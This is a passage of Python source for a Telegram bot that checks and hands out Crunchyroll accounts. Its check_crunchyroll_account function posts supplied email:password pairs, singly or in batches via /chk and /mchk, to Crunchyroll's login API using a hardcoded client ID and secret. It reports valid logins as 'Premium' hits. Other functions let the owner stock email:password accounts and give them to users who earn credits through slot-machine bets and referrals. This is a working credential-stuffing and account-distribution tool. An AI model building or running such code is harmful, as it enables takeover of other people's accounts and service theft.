    msg = bot.send_message(chat_id, f"💰 Yᴏᴜ ʜᴀᴠᴇ <b>{format_amount(user_balance)} ᴄʀᴇᴅɪᴛs</b>.\nEɴᴛᴇʀ ʏᴏᴜʀ ʙᴇᴛ ᴀᴍᴏᴜɴᴛ (e.g., 1.5):", parse_mode="HTML")
    
    def process_bet_amount(message):
        try:
            bet = float(message.text)
            if bet <= 0 or bet > user_balance:
                bot.send_message(chat_id, "❌ Iɴᴠᴀʟɪᴅ ʙᴇᴛ ᴀᴍᴏᴜɴᴛ. Tʀʏ ᴀɢᴀɪɴ.")
                return
                
            user_balances[user_id] -= bet

            initial_msg = bot.send_message(chat_id, "🎰 <b>𝗦𝗟𝗢𝗧 𝗠𝗔𝗖𝗛𝗜𝗡𝗘</b> ɪs sᴘɪɴɴɪɴɢ...", parse_mode="HTML")

            for _ in range(3):  
                time.sleep(0.5)
                spins = [[random.choice(slot_symbols) for _ in range(3)] for _ in range(3)]
                bot.edit_message_text(
                    f"🎰 <b>𝗦𝗟𝗢𝗧 𝗠𝗔𝗖𝗛𝗜𝗡𝗘</b>\n{slot_display(spins)}", 
                    chat_id, initial_msg.message_id, parse_mode="HTML"
                )

            # FINAL OUTPUT OF SLOT MACHINE
            spins = [[random.choice(slot_symbols) for _ in range(3)] for _ in range(3)]
            slot_output = slot_display(spins)
            bot.edit_message_text(
                f"🎰 <b>𝗦𝗟𝗢𝗧 𝗠𝗔𝗖𝗛𝗜𝗡𝗘</b>\n{slot_output}", 
                chat_id, initial_msg.message_id, parse_mode="HTML"
            )
            
            win_chance = {'easy': 0.8, 'normal': 0.5, 'hard': 0.3}[difficulty]
            multiplier = {'easy': 1.25, 'normal': 1.8, 'hard': 2.5}[difficulty]
            win = random.random() < win_chance

            time.sleep(1)  

            if win:
                winnings = bet * multiplier
                user_balances[user_id] += winnings
                bot.edit_message_text(
                    f"🎰 <b>𝗦𝗟𝗢𝗧 𝗠𝗔𝗖𝗛𝗜𝗡𝗘</b>\n{slot_output}\n\n🎉 <b>You won!</b>\n💰 <b>Earnings</b>: {format_amount(winnings)} credits.\n💼 <b>New Balance</b>: {format_amount(user_balances[user_id])} credits.",
                    chat_id, initial_msg.message_id, parse_mode="HTML"
                )
            else:
                bot.edit_message_text(
                    f"🎰 **𝗦𝗟𝗢𝗧 𝗠𝗔𝗖𝗛𝗜𝗡𝗗**\n{slot_output}\n\n😢 **You lost.**\n💼 **New Balance**: {format_amount(user_balances[user_id])} credits.",
                    chat_id, initial_msg.message_id, parse_mode="Markdown"
                )
        except ValueError:
            bot.send_message(chat_id, "❌ Iɴᴠᴀʟɪᴅ ɪɴᴘᴜᴛ. Pʟᴇᴀsᴇ ᴇɴᴛᴇʀ ᴀ ᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ.")
    
    bot.register_next_step_handler(msg, process_bet_amount)

# TASK MENY
def tasks(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id
    markup = types.InlineKeyboardMarkup(row_width=2)

    markup.add(
        types.InlineKeyboardButton("🎁 𝗗𝗔𝗜𝗟𝗬 𝗕𝗢𝗡𝗨𝗦", callback_data='daily_bonus'),
        types.InlineKeyboardButton("🔗 𝗥𝗘𝗙𝗘𝗥𝗥𝗔𝗟", callback_data='referral'),
        types.InlineKeyboardButton("🎰 𝗦𝗟𝗢𝗧", callback_data='slot_menu'),
        types.InlineKeyboardButton("🔙 𝗕𝗔𝗖𝗞", callback_data='back_to_menu')
    )
    
    task_message="🎯 <b>𝗧𝗔𝗦𝗞 𝗠𝗘𝗡𝗨</b>\n<i>Select a task to perform and earn credits:</i>\n<b>1️⃣ Daily Bonus</b> - Earn free credits every day!\n<b>2️⃣ Referral Program</b> - Invite friends and get rewards!\n<b>🎰 Slot Machine</b> - Try your luck and earn credits based on your bet!"
    safe_edit_message(bot, chat_id, message_id, task_message, reply_markup=markup, parse_mode="HTML")




# SLOT MENU DIFFICULTY
def slot_menu(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id
    markup = types.InlineKeyboardMarkup()

    markup.add(
        types.InlineKeyboardButton("🟢 𝗘𝗔𝗦𝗬", callback_data='slot_easy'),
        types.InlineKeyboardButton("🟡 𝗡𝗢𝗥𝗠𝗔𝗟", callback_data='slot_normal'),
        types.InlineKeyboardButton("🔴 𝗛𝗔𝗥𝗗", callback_data='slot_hard'),
        types.InlineKeyboardButton("🔙 𝗕𝗔𝗖𝗞", callback_data='tasks')
    )
    slot_message="🎰 <b>𝗦𝗟𝗢𝗧 𝗠𝗔𝗖𝗛𝗜𝗡𝗘</b>\n\n<i>Cʜᴏᴏsᴇ ʏᴏᴜʀ ᴅɪғғɪᴄᴜʟᴛʏ ʟᴇᴠᴇʟ ᴀɴᴅ ʙᴇᴛ ʏᴏᴜʀ ᴄʀᴇᴅɪᴛs</i>:"
    safe_edit_message(bot, chat_id, message_id, slot_message, reply_markup=markup, parse_mode="HTML")
    
#DAILY BONUS 
def daily_bonus(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id
    current_time = datetime.now()

    last_task_date = user_last_task.get(user_id)

    if last_task_date is None or (current_time - last_task_date).days >= 1:
        
        if user_id in authorized_users:
            luck_rates = [0.0, 0.5, 0.5]
        else:  # Free users
            luck_rates = [0.5, 0.3, 0.2]
        luck_level = random.choices(
            ["Lᴏᴡ", "Mɪᴅ", "Bʜᴀɪɴᴋᴀʀ"],  
            weights=luck_rates,
            k=1
        )[0]

        if luck_level == "Lᴏᴡ":
            bonus_amount = round(random.uniform(0.5, 1), 2)
        elif luck_level == "Mɪᴅ":
            bonus_amount = round(random.uniform(1, 1.5), 2)
        else:  # Rare luck
            bonus_amount = round(random.uniform(1.5, 2), 2)

        user_balances[user_id] = user_balances.get(user_id, 0) + bonus_amount
        user_last_task[user_id] = current_time  
        
        bonus_message = (
            f"🎉 <b>Congratulations!</b>\n\n"
            f"You've successfully claimed your <b>Daily Bonus</b>.\n"
            f"💰 <b>Bonus Amount:</b> {bonus_amount:.2f} credits\n"
            f"🎲 <b>Luck Level:</b> {luck_level.capitalize()} luck\n\n"
            f"Don't forget to come back tomorrow to earn more!"
        )
    else:
        
        bonus_message = (
            "❌ <b>Daily Bonus Already Claimed</b>\n\n"
            "You can only claim your <b>Daily Bonus</b> once every 24 hours.\n"
            "Please try again tomorrow!"
        )
        
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 𝗕𝗔𝗖𝗞", callback_data='tasks'))

    safe_edit_message(bot, chat_id, message_id, bonus_message, reply_markup=markup, parse_mode="HTML")

# Referral Program
def referral(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id
    invite_link = f"https://t.me/bhainkarcrunchyrollbot?start={user_id}"
    
    user_referrals[user_id] = user_referrals.get(user_id, 0)
    
    referral_message = (
    f"💎 <b>✨ 𝑹𝒆𝒇𝒆𝒓𝒓𝒂𝒍 𝑷𝒓𝒐𝒈𝒓𝒂𝒎 ✨</b>\n\n"
    f"🎁 <b>Earn Rewards!</b>\n"
    f"Invite your friends to join this bot and get <b>1 Credit</b> for each referral! "
    f"The more friends you invite, the more rewards you collect!\n\n"
    f"🔗 <b>Share This Link:</b>\n<code>{invite_link}</code>\n\n"
    f"📊 <b>Total Referrals:</b>\n<code>{user_referrals.get(user_id, 0)}</code>"
)

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 𝗕𝗔𝗖𝗞", callback_data='tasks'))
    safe_edit_message(bot, chat_id, message_id, referral_message, reply_markup=markup, parse_mode="HTML")

def back_to_menu(call):
    bot.send_message(
        call.message.chat.id,
        "🔙 Back to Main Menu\nUse /start to see options."
    )

#CHECK BALANCE BUTTON
def check_balance(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id
    balance = user_balances.get(user_id, 0)

    balance_message = (
        f"💰 <b>Your Balance</b>: {format_amount(balance)} credits\n\n"
        "🔄 Earn more credits by completing tasks or participating in activities!"
    )

    # Correctly arrange buttons in rows
    markup = types.InlineKeyboardMarkup()
    tasks_button = types.InlineKeyboardButton("🎯 𝗧𝗔𝗦𝗞𝗦", callback_data='tasks')
    balance_top_button = types.InlineKeyboardButton("💰 𝗕𝗔𝗟𝗔𝗡𝗖𝗘 𝗧𝗢𝗣", callback_data='balance_top_page_1')
    back_button = types.InlineKeyboardButton("🔙 𝗕𝗔𝗖𝗞", callback_data='back_to_menu')

    # Add buttons row by row
    markup.add(tasks_button, balance_top_button)  # First row
    markup.add(back_button)  # Second row

    safe_edit_message(bot, chat_id, message_id, balance_message, reply_markup=markup, parse_mode="HTML")


# BALANCE TOP 
def balance_top(call, page):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id
    sorted_balances = sorted(user_balances.items(), key=lambda x: x[1], reverse=True)
    start_index = (page - 1) * 10
    end_index = start_index + 10
    current_page = sorted_balances[start_index:end_index]

    if not current_page:
        bot.answer_callback_query(call.id, "No data to display on this page.")
        return

    balance_message = "🏆 <b>𝗕𝗔𝗟𝗔𝗡𝗖𝗘 𝗧𝗢𝗣</b> 🏆\n\n"
    for rank, (chat_id, balance) in enumerate(current_page, start=start_index + 1):
        user = bot.get_chat(chat_id)
        first_name = user.first_name
        balance_message += (
            f"🎖 <b>Rank {rank}</b>\n"
            f"👤 <a href='tg://user?id={chat_id}'>{first_name}</a>\n"
            f"💳 Balance: <b>{format_amount(balance)}</b>\n\n"
        )

    markup = types.InlineKeyboardMarkup()
    if end_index < len(sorted_balances): 
        markup.add(types.InlineKeyboardButton("➡️ 𝗡𝗘𝗫𝗧", callback_data=f'balance_top_page_{page + 1}'))
    if page > 1: 
        markup.add(types.InlineKeyboardButton("⬅️ 𝗣𝗥𝗘𝗩𝗜𝗢𝗨𝗦", callback_data=f'balance_top_page_{page - 1}'))
    markup.add(types.InlineKeyboardButton("🔙 𝗕𝗔𝗖𝗞", callback_data='check_balance'))

    safe_edit_message(bot, chat_id, message_id, balance_message, reply_markup=markup, parse_mode="HTML")
    
   
   
   #WITHDRAW BUTTON 
def withdraw(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🏦 𝗪𝗜𝗧𝗛𝗗𝗥𝗔𝗪", callback_data='execute_withdraw'),
        types.InlineKeyboardButton("🗂 𝗦𝗧𝗢𝗖𝗞", callback_data='view_stock'),
        types.InlineKeyboardButton("🔙 𝗕𝗔𝗖𝗞", callback_data='back_to_menu')
    )
    if call.from_user.id == owner_id2:
        markup.add(
            types.InlineKeyboardButton("➕ 𝗔𝗗𝗗 𝗔𝗖𝗖", callback_data='add_accounts2'),
            types.InlineKeyboardButton("➖ 𝗥𝗘𝗠𝗢𝗩𝗘 𝗔𝗖𝗖", callback_data='remove_accounts2'),
            types.InlineKeyboardButton("🗂 𝗦𝗧𝗢𝗖𝗞", callback_data='adminview_stock'),
        )

    withdraw_menu = (
        "\n\n🎯 <b>What happens after withdrawal?</b>\n➤ You'll receive a verified Crunchyroll account with a premium subscription.\n➤ Use it to watch your favorite anime and dramas without interruptions!\n\n"
        "🚨 <b>Important Guidelines:</b>\n"
        "1️⃣ Ensure you have enough balance for the withdrawal.\n"
        "2️⃣ Accounts are non-transferable. Use it responsibly!\n"
        "3️⃣ Don't spam click withdraw button. Your account will disappear!"
    )
    safe_edit_message(bot, chat_id, message_id, withdraw_menu, reply_markup=markup, parse_mode="HTML")


def execute_withdraw(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id
    balance = user_balances.get(user_id, 0)

    if len(account_stock2) == 0:
        withdraw_message = (
            "❌ <b>Nᴏ ᴀᴄᴄᴏᴜɴᴛs ᴀᴠᴀɪʟᴀʙʟᴇ ɪɴ sᴛᴏᴄᴋ.</b>\n\n"
            "Pʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ ᴏʀ ᴄᴏᴍᴘʟᴇᴛᴇ ᴍᴏʀᴇ ᴛᴀsᴋ."
        )

        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🔙 𝗕𝗔𝗖𝗞", callback_data='withdraw'))
        safe_edit_message(bot, chat_id, message_id, withdraw_message, reply_markup=markup, parse_mode="HTML")
        return

    if balance >= withdraw_threshold:
        account = account_stock2.pop(0)
        user_balances[user_id] -= withdraw_threshold

        withdraw_message = (
            f"🏦 <b>Wɪᴛʜᴅʀᴀᴡ Sᴜᴄᴄᴇssғᴜʟ</b>\n\n"
            f"Cʀᴜɴᴄʜʏʀᴏʟʟ ᥫ᭡ Pʀᴇᴍɪᴜᴍ\n\n<code>{account}</code>\n\n"
            "Tʜᴀɴᴋ ʏᴏᴜ ғᴏʀ ᴜsɪɴɢ ᴏᴜʀ sᴇʀᴠɪᴄᴇ!"
        )
    else:
        withdraw_message = (
            "❌ <b>Iɴsᴜғғɪᴄɪᴇɴᴛ Bᴀʟᴀɴᴄᴇ</b>\n\n"
            "Yᴏᴜ ɴᴇᴇᴅ ᴀᴛ ʟᴇᴀsᴛ 2 ᴄʀᴇᴅɪᴛs ᴛᴏ ʀᴇᴅᴇᴇᴍ ᴀɴ ᴀᴄᴄᴏᴜɴᴛ."
        )

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 𝗕𝗔𝗖𝗞", callback_data='withdraw'))

    safe_edit_message(bot, chat_id, message_id, withdraw_message, reply_markup=markup, parse_mode="HTML")

def view_stock(call):
    chat_id = call.message.chat.id

    stock_count = len(account_stock2)

    if stock_count == 0:
        stock_message = "🗂 <b>Sᴛᴏᴄᴋ</b>: <i>Nᴏ ᴀᴄᴄᴏᴜɴᴛs ᴀᴠᴀɪʟᴀʙʟᴇ ɪɴ sᴛᴏᴄᴋ.</i>"
    else:
        stock_message = f"🗂 <b>Sᴛᴏᴄᴋ</b>: <b>{stock_count} ᴀᴄᴄᴏᴜɴᴛs</b> ᴀʀᴇ ᴀᴠᴀɪʟᴀʙʟᴇ."

    bot.send_message(chat_id, stock_message, parse_mode="HTML")


def adminview_stock(call):
    chat_id = call.message.chat.id

    if len(account_stock2) == 0:
        stock_message = "🗂 <b>Sᴛᴏᴄᴋ</b>: <i>Nᴏ ᴀᴄᴄᴏᴜɴᴛs ᴀᴠᴀɪʟᴀʙʟᴇ ɪɴ sᴛᴏᴄᴋ.</i>"
    else:
        adminstock_message = (
            f"🗂 <b>Sᴛᴏᴄᴋ</b>:\n\n" +
            "\n".join([f"<code>{account}</code>" for account in account_stock2])
        )
        
    bot.send_message(chat_id, adminstock_message,parse_mode="HTML")

        

#ADD ACC 2
def add_accounts2(call):
    if call.from_user.id != owner_id2:  
    
        bot.send_message(call.message.chat.id, "❌ This option is for owners only.")
        return

    bot.send_message(
        chat_id=call.message.chat.id,
        text="➕ Add accounts (one per line in format: email:password) to Stock2.",
    )
    bot.register_next_step_handler(call.message, process_add_accounts2)

#PROCESS TO ADD AC IN THIS CODE 
def process_add_accounts2(message):
    accounts = message.text.splitlines()
    formatted_accounts = [account.strip() for account in accounts if ":" in account]

    account_stock2.extend(formatted_accounts)

    bot.send_message(
        chat_id=message.chat.id,
        text=f"✅ Successfully added {len(formatted_accounts)} accounts to Stock2."
    )


#REMOCE ACC2 
def remove_accounts2(call):
    if call.from_user.id != owner_id2:  
        bot.send_message(call.message.chat.id, "❌ This option is for owners only.")
        return

    bot.send_message(
        chat_id=call.message.chat.id,
        text="➖ Remove accounts (one per line). Will remove from account_stock2.",
    )
    bot.register_next_step_handler(call.message, process_remove_accounts2)

#PROCESS TO ADD ACC 2
def process_remove_accounts2(message):
    accounts_to_remove = message.text.splitlines()
    account_stock2[:] = [account for account in account_stock2 if account not in accounts_to_remove]

    bot.send_message(
        chat_id=message.chat.id,
        text=f"✅ Successfully removed specified accounts from account_stock2."
    )
    
#BACK BUTTON MENU
def back_to_menu(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📊 𝗦𝗧𝗔𝗧𝗦", callback_data='stats'),
        types.InlineKeyboardButton("🏆 𝗨𝗦𝗘𝗥𝗟𝗜𝗦𝗧", callback_data='lb'),
        types.InlineKeyboardButton("🆘 𝗦𝗨𝗣𝗣𝗢𝗥𝗧", callback_data='support'),
        types.InlineKeyboardButton("🔧 𝗔𝗖𝗖 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗢𝗥", callback_data='open_gen_menu')
    )
    markup.add(
        types.InlineKeyboardButton("💰 𝗕𝗔𝗟𝗔𝗡𝗖𝗘", callback_data='check_balance'),
        types.InlineKeyboardButton("🎯 𝗧𝗔𝗦𝗞𝗦", callback_data='tasks'),
        types.InlineKeyboardButton("🏦 𝗪𝗜𝗧𝗛𝗗𝗥𝗔𝗪", callback_data='withdraw')
    )
    
    backmenu_message="<b>🚀 Choose an option:</b>\n\n- <b>📊 Stats</b>: Overview of bot stats.\n- <b>🏆 UserBoard</b>: See the top users.\n- <b>🆘 Support</b>: Get help.\n- <b>🔧 Account Generator</b>: Free Crunchyroll accounts.\n\n<b>💰 Balance</b> | <b>🏦 Withdraw</b> | <b>🎯 Tasks</b>"
    safe_edit_message(bot, chat_id, message_id, backmenu_message, reply_markup=markup, parse_mode="HTML")
    
#ADD USER TO PREMIUM PLAN
@bot.message_handler(commands=['add'])
def authorize_user(message):
    user_id = str(message.from_user.id)
    if user_id != owner_id:
        bot.send_message(message.chat.id, "Unauthorized! Only the owner can authorize users.")
        return

    try:
        user_to_authorize = str(message.text.split()[1])
    except IndexError:
        bot.send_message(message.chat.id, "Provide a valid user ID to authorize.")
        return

    if user_to_authorize in free_users:
       
        free_users.remove(user_to_authorize)
        if user_to_authorize not in authorized_users:
            authorized_users.add(user_to_authorize) 
        bot.send_message(message.chat.id, f"User {user_to_authorize} has been authorized!")
    else:
        bot.send_message(message.chat.id, "User not found in the free list.")

#REMOVE USER FROM PREMIUM PLAN
@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.from_user.id)
    if user_id != owner_id:
        bot.send_message(message.chat.id, "Unauthorized! Only the owner can remove users.")
        return

    try:
        user_to_remove = str(message.text.split()[1])
    except IndexError:
        bot.send_message(message.chat.id, "Provide a valid user ID to remove.")
        return

    if user_to_remove in authorized_users:
        
        authorized_users.remove(user_to_remove)
        if user_to_remove not in free_users:
            free_users.add(user_to_remove)  #
        bot.send_message(message.chat.id, f"User {user_to_remove} has been removed from authorized users.")
    elif user_to_remove in free_users:
        
        free_users.remove(user_to_remove)
        bot.send_message(message.chat.id, f"User {user_to_remove} has been removed from free users.")
    else:
        bot.send_message(message.chat.id, "User not found.")

#CMD TO CHECK ACC
@bot.message_handler(commands=['chk'])
@anti_spam
def chk(message):
    user_id = str(message.from_user.id)
    current_time = time.time()

    try:
        
        email, pasw = message.text.split()[1].split(':')
       
        if not check_account_format(email, pasw):
            bot.send_message(message.chat.id, "Usᴇ /chk email:pass Tᴏ Sᴛᴀʀᴛ Cʜᴇᴄᴋɪɴɢ", disable_web_page_preview=True)
            return

        if user_id not in authorized_users:
            if user_id in cooldown and (current_time - cooldown[user_id] < cooldown_time):
                remaining_time = int(cooldown_time - current_time - cooldown[user_id])
                bot.send_message(message.chat.id, f"Yᴏᴜ'ʀᴇ Oɴ Cᴏᴏʟᴅᴏᴡɴ! Tʀʏ Aɢᴀɪɴ Iɴ {remaining_time} Sᴇᴄᴏɴᴅs.", disable_web_page_preview=True)
                return
                cooldown[user_id] = current_time

        bot.send_message(message.chat.id, "Pʀᴏᴄᴇssɪɴɢ...", disable_web_page_preview=True)

        
        result = check_crunchyroll_account(email, pasw, message)
        bot.send_message(message.chat.id, result, parse_mode='HTML', disable_web_page_preview=True)
        
    except (ValueError, IndexError):
        
        bot.send_message(message.chat.id, "Usᴇ /chk email:pass Tᴏ Sᴛᴀʀᴛ Cʜᴇᴄᴋɪɴɢ", disable_web_page_preview=True)


def check_account_format(email, pasw):
  
    if "@" in email and len(pasw) > 0:
        return True
    return False

#CMD TO CHECK ACC IN MASS AMOUNT 
@bot.message_handler(commands=['mchk'])
@anti_spam
def mchk(message):
    user_id = str(message.from_user.id)

    try:
        accounts = message.text.split()[1:]
        if not accounts:
            bot.send_message(message.chat.id, "Usᴇ /mchk email:pass\n𝗡𝗢𝗧𝗘: Fʀᴇᴇ ᴜsᴇʀ ᴄᴀɴ ᴄʜᴇᴄᴋ ᴏɴʟʏ 3 ᴀᴄᴄ ᴀᴛ ᴀ ᴛɪᴍᴇ", disable_web_page_preview=True)
            return

        if len(accounts) > mchk_max_free and not is_authorized(user_id):
            bot.send_message(message.chat.id, f"Fʀᴇᴇ Usᴇʀs Cᴀɴ Cʜᴇᴄᴋ Uᴘ ᴛᴏ {mchk_max_free} Aᴄᴄᴏᴜɴᴛs Aᴛ A Tɪᴍᴇ.", disable_web_page_preview=True)
            return

        bot.send_message(message.chat.id, "Pʀᴏᴄᴇssɪɴɢ Mᴜʟᴛɪᴘʟᴇ Aᴄᴄᴏᴜɴᴛs...")

        for account in accounts:
            if ":" not in account:
                bot.send_message(message.chat.id, f"Iɴᴠᴀʟɪᴅ Fᴏʀᴍᴀᴛ: {account}", disable_web_page_preview=True)
                continue

            email, pasw = account.split(':')
            result = check_crunchyroll_account(email, pasw, message)
            bot.send_message(message.chat.id, result, parse_mode='HTML', disable_web_page_preview=True)

        if user_id not in user_limits:
          user_limits[user_id] = {'count': 0}

        if not is_authorized(user_id):
           user_limits[user_id]['count'] += len(accounts)

    except (ValueError, IndexError):
        bot.send_message(message.chat.id, "Usᴇ /mchk email:pass [email:pass] (up to 3 for free users)", disable_web_page_preview=True)

#ACC CHECKING LOGIC
def check_crunchyroll_account(email, pasw, message):
    headers = {
        "ETP-Anonymous-ID": str(uuid1()),
        "Request-Type": "SignIn",
        "Accept": "application/json",
        "Accept-Charset": "UTF-8",
        "User-Agent": "Ktor client",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Host": "beta-api.crunchyroll.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip"
    }
    data = {
        "grant_type": "password",
        "username": email,
        "password": pasw,
        "scope": "offline_access",
        "client_id": "yhukoj8on9w2pcpgjkn_",
        "client_secret": "q7gbr7aXk6HwW5sWfsKvdFwj7B1oK1wF",
        "device_type": "FIRETV",
        "device_id": str(uuid1()),
        "device_name": "kara"
    }

    try:
        res = requests.post("https://beta-api.crunchyroll.com/auth/v1/token", data=data, headers=headers)

        if "refresh_token" in res.text:
            token = res.json().get('access_token')
            headers_get = {
                "Authorization": f"Bearer {token}",
                "Accept": "application/json",
                "Accept-Charset": "UTF-8",
                "User-Agent": "Ktor client",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }

            res_get = requests.get("https://beta-api.crunchyroll.com/accounts/v1/me", headers=headers_get)

            if "external_id" in res_get.text:
              
                first_name = message.from_user.first_name
                username = message.from_user.username
                user_id = message.from_user.id

               
                plan_type = "Bʜᴀɪɴᴋᴀʀ Pʟᴀɴ" if is_authorized(user_id) else "Fʀᴇᴇ Pʟᴀɴ"
                if username:
                    profile_link = f'<a href="https://t.me/{username}">{first_name}</a>'
                else:
                    profile_link = f'<a href="tg://user?id={user_id}">{first_name}</a>'

                return (f"<b>Cʀᴜɴᴄʜʏʀᴏʟʟ ᥫ᭡ Pʀᴇᴍɪᴜᴍ</b>\n\n<b>Eᴍᴀɪʟ</b> ✉️: <code>{email}</code>\n<b>Pᴀssᴡᴏʀᴅ</b> 🔑: <code>{pasw}</code>\n\n<b><i>Cʜᴇᴄᴋᴇᴅ ʙʏ</i></b> {profile_link}\n<b><i>Pʟᴀɴ: {plan_type}</i></b>\n<b>Bᴏᴛ ʙʏ</b> @bhainkar")
        elif "Pᴀssᴡᴏʀᴅ ɪs ɪɴᴄᴏʀʀᴇᴄᴛ" in res.text:
            return f"<blockquote expandable>❌ 𝗕𝗔𝗗: {email}:{pasw}</blockquote>"
        elif "Tᴏᴏ ᴍᴀɴʏ ᴀᴛᴛᴇᴍᴘᴛs" in res.text:
            return f"<blockquote expandable>⚠️ 𝗖𝗨𝗦𝗧𝗢𝗠: {email} - Tᴏᴏ ᴍᴀɴʏ ᴀᴛᴛᴇᴍᴘᴛs. Tʀʏ ʟᴀᴛᴇʀ.</blockquote>"
        else:
            return f"<blockquote expandable>⚠️ 𝗖𝗨𝗦𝗧𝗢𝗠: {email} - Uɴᴋɴᴏᴡɴ ᴇʀʀᴏʀ ᴏᴄᴄᴜʀʀᴇᴅ.</blockquote>"
    except requests.exceptions.RequestException as e:
        return f"<blockquote expandable>⚠️ 𝗖𝗨𝗦𝗧𝗢𝗠: {email} - Fᴀɪʟᴇᴅ ᴛᴏ ᴄᴏɴɴᴇᴄᴛ.</blockquote>"

#COMMAND TO GET DETAILS
@bot.message_handler(commands=['details'])
def details(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    
    plan_type = "Bʜᴀɪɴᴋᴀʀ Pʟᴀɴ" if is_authorized(user_id) else "Fʀᴇᴇ Pʟᴀɴ"
    chat_id = message.chat.id
    gif_url = "https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExNWt0YWZyaHRrbG5xNzN4MTlkOWZmeDRyZ2ZjcmlwMjhlcnE1azVlNiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/2FHr56vo08zbq8ac0C/giphy.gif"
    bot.send_animation(chat_id, gif_url, caption=f"𝗬𝗼𝘂𝗿 𝗗𝗲𝘁𝗮𝗶𝗹𝘀:\n<b>Username:</b> @{username}\n<b>Chat ID:</b> <code>{user_id}</code>\n<b>Plan:</b> {plan_type}\n\n<b>Bᴏᴛ ʙʏ</b> @bhainkar", parse_mode="HTML",)
    


#BROADCAST CMD TO NOTIFY ALL USER
owner_draft = {}
@bot.message_handler(commands=['broadcast'])
def broadcast(message):
    user_id = message.from_user.id
    if str(user_id) != owner_id:
        bot.send_message(message.chat.id, "⛔ Unauthorized! Only the owner can broadcast messages.")
        return

    broadcast_message = message.text.partition(" ")[2]
    if not broadcast_message.strip():
        bot.send_message(message.chat.id, "⚠️ Please use /broadcast MESSAGE to broadcast.")
        return

    owner_draft[user_id] = broadcast_message
    bot.send_message(
        message.chat.id, 
        "✍️ Your broadcast draft has been saved.\n\nUse the following commands:\n"
        "👁 /preview - Preview the message\n"
        "📢 /send - Send the message to all users."
    )

#CMD TO PREVIEW BC MSG
@bot.message_handler(commands=['preview'])
def preview(message):
    user_id = message.from_user.id
    if str(user_id) != owner_id:
        bot.send_message(message.chat.id, "⛔ Unauthorized!")
        return

    broadcast_message = owner_draft.get(user_id)
    if not broadcast_message:
        bot.send_message(message.chat.id, "⚠️ No draft found. Please use /broadcast to draft a message.")
        return

    bot.send_message(message.chat.id, f"👁 <b>Broadcast Preview:</b>\n\n{broadcast_message}", parse_mode='HTML')

#CMD TO SEND BC MSG TO ALL USER
@bot.message_handler(commands=['send'])
def send_broadcast(message):
    global authorized_users, free_users
    user_id = message.from_user.id
    
    if str(user_id) != owner_id:
        bot.send_message(message.chat.id, "⛔ Unauthorized! Only the owner can send broadcast messages.")
        return

    broadcast_message = owner_draft.get(user_id)
    if not broadcast_message:
        bot.send_message(message.chat.id, "⚠️ No draft found. Please create a draft using /broadcast before sending.")
        return

    sent_count = 0
    failed_count = 0
    
    all_users = authorized_users | free_users
    
    for user_id in all_users:
        try:
            
            bot.send_message(user_id, broadcast_message, disable_web_page_preview=True)
            sent_count += 1
        except Exception as e:
            failed_count += 1
            print(f"Failed to send message to {user_id}: {e}")  
            
    bot.send_message(
        message.chat.id,
        f"✅ Broadcast sent successfully.\n"
        f"👥 Total: {len(all_users)}\n✅ Sent: {sent_count}\n❌ Failed: {failed_count}"
    )

  
    owner_draft.pop(user_id, None)
if __name__ == "__main__":
    bot.remove_webhook()
    bot.set_webhook(url="https://niga-ra1e.onrender.com/" + bot.token)  # Replace with your server URL
    app.run(host="0.0.0.0", port=5000)